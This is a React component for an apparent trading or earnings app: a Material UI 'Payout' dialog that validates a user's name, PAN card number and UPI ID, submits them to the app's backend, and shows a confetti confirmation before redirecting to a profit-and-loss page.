import React, { useState } from "react";
import {
    Dialog,
    DialogTitle,
    DialogContent,
    DialogActions,
    TextField,
    Button,
    Box,
    Stack,
    Typography,
    Paper,
    Checkbox
} from "@mui/material";
import { useFormik } from "formik";
import * as Yup from "yup";
import axios from "axios";
import PaidIcon from '@mui/icons-material/Paid';
import { motion } from "framer-motion";
import { useNavigate } from "react-router-dom";
import Confetti from 'react-confetti';
import { useWindowSize } from 'react-use';

// ✅ Validation Schema
const validationSchema = Yup.object({
    name: Yup.string().required("Name is required"),
    pancard: Yup.string()
        .matches(/^[A-Z]{5}[0-9]{4}[A-Z]{1}$/, "Invalid PAN card format")
        .required("PAN card is required"),
    upiId: Yup.string()
        .matches(/^[\w.-]+@[\w.-]+$/, "Invalid UPI ID format")
        .required("UPI ID is required"),
});

const PayloadDialogForm = () => {
    const [open, setOpen] = useState(true);
    const [submitted, setSubmitted] = useState(false);
    const [isDisabled, setIsDisabled] = useState(false);
    const navigate = useNavigate();
    const { width, height } = useWindowSize();

    const formik = useFormik({
        initialValues: {
            name: "",
            pancard: "",
            upiId: "",
        },
        validationSchema,
        onSubmit: async (values, { resetForm }) => {
            setSubmitted(true);
            try {
                await axios.post('https://lx-backend-x7ip.onrender.com/congrats', {
                    Username: values.name,
                    Pancard: values.pancard,
                    UpiId: values.upiId,
                });

                setTimeout(() => {
                    resetForm();
                    setSubmitted(false);
                    setOpen(false);
                    navigate('/pnl');
                }, 7000);
            } catch (error) {
                console.error('Error submitting details:', error);
            }
        },
    });

    const handleClose = () => {
        navigate('/pnl');
    };

    return (
        <Dialog
            open={open}
            fullWidth
            maxWidth="sm"
            PaperProps={{
                sx: {
                    backgroundColor: submitted ? "#000" : "#121212",
                    borderRadius: 2,
                    overflow: "hidden",
                },
            }}
            BackdropProps={{
                sx: {
                    backgroundColor: submitted ? "#000" : "rgb(26, 25, 25)",
                },
            }}
        >
            {submitted ? (
                <>
                    <Box
                        sx={{
                            width: "100%",
                            height: "100vh",
                            overflow: "hidden",
                            display: "flex",
                            alignItems: "center",
                            justifyContent: "center",
                            backgroundColor: "#000",
                        }}
                    >
                        <Confetti width={width} height={height} numberOfPieces={300} recycle={false} />

                        <motion.div
                            initial={{ scale: 0 }}
                            animate={{ scale: 1 }}
                            transition={{ type: "spring", stiffness: 120, damping: 10 }}
                            style={{ display: "inline-block" }}
                        >
                            <Paper
                                elevation={6}
                                sx={{
                                    p: 3,
                                    backgroundColor: "#1e1e1e",
                                    borderRadius: 2,
                                    textAlign: "center",
                                    color: "lightgreen",
                                    boxShadow: "0 0 20px 5px rgba(0, 255, 0, 0.6)",
                                    maxWidth: "400px",
                                    mx: "auto",
                                }}
                            >
                                <Typography variant="body1" color="success" fontWeight={'Bold'} gutterBottom>
                                    🎉 Withdawal request accepted
                                </Typography>
                                <Typography variant="body2">
                                    Your details have been successfully submitted.
                                </Typography>
                            </Paper>
                        </motion.div>
                    </Box>
                </>
            ) : (
                <>
                    <DialogTitle
                        sx={{
                            backgroundColor: "#1e1e1e",
                            color: "white",
                            fontWeight: 'bold',
                            textAlign: "center"
                        }}
                    >
                        <PaidIcon sx={{ fontSize: 23, color: "lightgreen", mr: 0.7 }} />
                        Payout
                    </DialogTitle>
                    <form onSubmit={formik.handleSubmit}>
                        <Box sx={{ backgroundColor: "#121212", p: 3, boxShadow: "0 0 20px 5px rgba(0, 255, 0, 0.6)" }}>
                            <DialogContent>
                                <TextField
                                    fullWidth
                                    margin="normal"
                                    label="Name"
                                    name="name"
                                    color="success"
                                    value={formik.values.name}
                                    onChange={formik.handleChange}
                                    onBlur={formik.handleBlur}
                                    error={formik.touched.name && Boolean(formik.errors.name)}
                                    helperText={formik.touched.name && formik.errors.name}
                                    InputLabelProps={{ style: { color: "white" } }}
                                    InputProps={{
                                        style: { color: "#fff" },
                                        sx: {
                                            '& fieldset': { borderColor: "lightgreen" },
                                            '&:hover fieldset': { borderColor: "green" },
                                            '&.Mui-focused fieldset': { borderColor: "green" }
                                        }
                                    }}
                                />
                                <TextField
                                    fullWidth
                                    margin="normal"
                                    label="PAN Card"
                                    name="pancard"
                                    color="success"
                                    value={formik.values.pancard}
                                    onChange={formik.handleChange}
                                    onBlur={formik.handleBlur}
                                    error={formik.touched.pancard && Boolean(formik.errors.pancard)}
                                    helperText={formik.touched.pancard && formik.errors.pancard}
                                    InputLabelProps={{ style: { color: "white" } }}
                                    InputProps={{
                                        style: { color: "#fff" },
                                        sx: {
                                            '& fieldset': { borderColor: "lightgreen" },
                                            '&:hover fieldset': { borderColor: "green" },
                                            '&.Mui-focused fieldset': { borderColor: "green" }
                                        }
                                    }}
                                />
                                <TextField
                                    fullWidth
                                    margin="normal"
                                    label="UPI ID"
                                    color="success"
                                    name="upiId"
                                    value={formik.values.upiId}
                                    onChange={formik.handleChange}
                                    onBlur={formik.handleBlur}
                                    error={formik.touched.upiId && Boolean(formik.errors.upiId)}
                                    helperText={formik.touched.upiId && formik.errors.upiId}
                                    InputLabelProps={{ style: { color: "white" } }}
                                    InputProps={{
                                        style: { color: "#fff" },
                                        sx: {
                                            '& fieldset': { borderColor: "lightgreen" },
                                            '&:hover fieldset': { borderColor: "green" },
                                            '&.Mui-focused fieldset': { borderColor: "green" }
                                        }
                                    }}
                                />
                                <Stack direction="row" alignItems="center" onClick={() => setIsDisabled(!isDisabled)}>
                                    <Checkbox checked={isDisabled} sx={{ color: "lightgreen" }} />
                                    <Typography variant="body2" color="#ffffff">
                                        I agree to the <a href="/term">Terms and Conditions</a>
                                    </Typography>
                                </Stack>
                            </DialogContent>
                            <DialogActions>
                                <Button variant="contained" sx={{ backgroundColor: "#c62828", "&:hover": { backgroundColor: "#b71c1c" } }} onClick={handleClose}>
                                    Cancel
                                </Button>
                                <Button type="submit" variant="contained" sx={{ backgroundColor: "green", "&:hover": { backgroundColor: "#2e7d32" } }} disabled={!isDisabled}>
                                    Submit
                                </Button>
                            </DialogActions>
                        </Box>
                    </form>
                </>
            )}
        </Dialog>
    );
};

export default PayloadDialogForm;
